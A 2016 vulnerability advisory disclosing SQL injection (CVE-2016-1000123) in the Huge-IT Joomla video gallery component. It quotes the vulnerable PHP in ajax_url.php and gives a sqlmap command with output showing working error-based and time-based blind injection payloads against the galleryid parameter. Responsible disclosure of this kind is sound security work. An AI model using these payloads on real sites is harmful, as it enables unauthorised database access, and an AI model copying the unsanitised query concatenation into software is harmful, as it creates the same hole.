Author: Larry W. Cashdollar, @_larry0
Date: 2016-09-15
Download Site: http://huge-it.com/joomla-video-gallery/
Vendor: www.huge-it.com, fixed v1.1.0
Vendor Notified: 2016-09-17
Vendor Contact: info@huge-it.com
Description: A video slideshow gallery.
Vulnerability:
 
Vulnerable Code in : ajax_url.php
 
 11 define(&#039;_JEXEC&#039;,1);
 12 defined(&#039;_JEXEC&#039;) or die(&#039;Restircted access&#039;);
.
.
.
 28         if($_POST[&#039;task&#039;]=="load_videos_content"){
 29 
 30             $page = 1;
 31 
 32 
 33             if(!empty($_POST["page"]) && is_numeric($_POST[&#039;page&#039;]) && $_POST[&#039;page&#039;]>0){
 34                 $paramssld=&#039;&#039;;
 35                 $db5 = JFactory::getDBO();
 36                 $query5 = $db->getQuery(true);
 37                 $query5->select(&#039;*&#039;);
 38                 $query5->from(&#039;#__huge_it_videogallery_params&#039;);
 39                 $db->setQuery($query5);
 40                 $options_params = $db5->loadObjectList();
 41                 foreach ($options_params as $rowpar) {
 42                     $key = $rowpar->name;
 43                     $value = $rowpar->value;
 44                     $paramssld[$key] = $value;
 45                 }
 46                 $page = $_POST["page"];
 47                 $num=$_POST[&#039;perpage&#039;];
 48                 $start = $page * $num - $num;
 49                 $idofgallery=$_POST[&#039;galleryid&#039;];
 50 
 51                 $query = $db->getQuery(true);
 52                 $query->select(&#039;*&#039;);
 53                 $query->from(&#039;#__huge_it_videogallery_videos&#039;);
 54                 $query->where(&#039;videogallery_id =&#039;.$idofgallery);
 55                 $query ->order(&#039;#__huge_it_videogallery_videos.ordering asc&#039;);
 56                 $db->setQuery($query,$start,$num);
 
CVE-2016-1000123
Exploit Code:
  aC/ $ sqlmap -u &#039;http://server/components/com_videogallerylite/ajax_url.php&#039; --data="page=1&galleryid=*&task=load_videos_content&perpage=20&linkbutton=2"  --level=5 --risk=3
  aC/ .
  aC/ .
  aC/ .
  aC/ (custom) POST parameter &#039;#1*&#039; is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
  aC/ sqlmap identified the following injection point(s) with a total of 2870 HTTP(s) requests:
  aC/ ---
  aC/ Parameter: #1* ((custom) POST)
  aC/     Type: error-based
  aC/     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
  aC/     Payload: page=1&galleryid=-3390 OR 1 GROUP BY CONCAT(0x716b766271,(SELECT (CASE WHEN (2575=2575) THEN 1 ELSE 0 END)),0x7170767071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&task=load_videos_content&perpage=20&linkbutton=2
  aC/  
  aC/     Type: AND/OR time-based blind
  aC/     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
  aC/     Payload: page=1&galleryid=(CASE WHEN (5952=5952) THEN SLEEP(5) ELSE 5952 END)&task=load_videos_content&perpage=20&linkbutton=2
  aC/ ---
  aC/ [19:36:55] [INFO] the back-end DBMS is MySQL
  aC/ web server operating system: Linux Debian 8.0 (jessie)
  aC/ web application technology: Apache 2.4.10
  aC/ back-end DBMS: MySQL >= 5.0.12
  aC/ [19:36:55] [WARNING] HTTP error codes detected during run:
  aC/ 500 (Internal Server Error) - 2714 times
  aC/ [19:36:55] [INFO] fetched data logged to text files under &#039;/home/larry/.sqlmap/output/192.168.0.4&#039;
  aC/  
  aC/ [*] shutting down at 19:36:55
Advisory: http://www.vapidlabs.com/advisory.php?v=169

